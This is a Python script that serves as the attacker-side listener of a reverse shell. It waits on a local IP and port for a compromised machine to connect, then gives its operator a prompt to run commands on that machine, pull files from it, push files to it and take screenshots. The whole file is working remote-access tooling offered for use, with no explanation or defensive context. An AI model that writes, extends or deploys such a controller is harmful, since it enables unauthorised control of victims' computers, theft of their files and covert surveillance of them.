#!/usr/bin/env python3
#_*_ coding: utf8 _*_

import socket
import base64


def shell():
    current_dir = target.recv(1024).decode()
    count = 0
    while True:
        command = input('{} ~#: '.format(current_dir))

        if command == "exit":
            target.send(command.encode())
            break
        elif command[:2] == "cd":
            target.send(command.encode())
            res = target.recv(1024).decode()
            current_dir = res
            print(res)
        elif command == "":
            pass
        elif command[:8] == "download":
            target.send(str.encode(command))
            with open(command[9:], 'wb') as file_download:
                data = target.recv(30000)
                file_download.write(base64.b64decode(data))
        elif command[:6] == "upload":
            try:
                target.send(str.encode(command))
                with open(command[7:], 'rb') as file_upload:
                    target.send(base64.b64encode(file_upload.read()))
            except:
                print("[!] ERROR UPLOADING FILE...")
        elif command[:10] == "screenshot":
            target.send(str.encode(command))
            with open("monitor-%d.png" % count, 'wb') as screen:
                data = target.recv(1000000)
                data_decode = base64.b64decode(data)
                if data_decode == "fail":
                    print("[!] ERROR TAKING SCREENSHOT...")
                else:
                    screen.write(data_decode)
                    print("[*] SCREENSHOT DONE!")
                    count = count + 1
        else:
            target.send(str.encode(command))
            res = target.recv(1000000)
            if res == "1":
                continue
            else:
                res_clear = "".join(map(chr, res))
                print(res_clear)

def serverUp():
    global server
    global ip
    global target
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server.bind(('192.168.1.12', 9001))
    server.listen(1)

    print("============Server Up============")
    print("[*] Waiting for connections...")

    target, ip = server.accept()

    print(f"[*] Connection received from {ip[0]}")

serverUp()
shell()
server.close()
